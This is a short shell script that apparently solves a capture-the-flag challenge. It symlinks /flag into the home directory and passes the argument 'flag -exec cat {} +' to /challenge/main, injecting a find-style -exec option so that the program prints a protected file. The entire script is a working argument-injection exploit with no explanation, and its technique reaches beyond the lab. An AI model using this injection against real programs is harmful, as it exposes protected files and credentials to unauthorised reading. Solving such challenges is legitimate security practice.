#!/bin/sh
cp /bin/cat ~/
ln -sv /flag ~/flag
arg="flag -exec cat {} +"
cd /challenge/
./main "$arg"
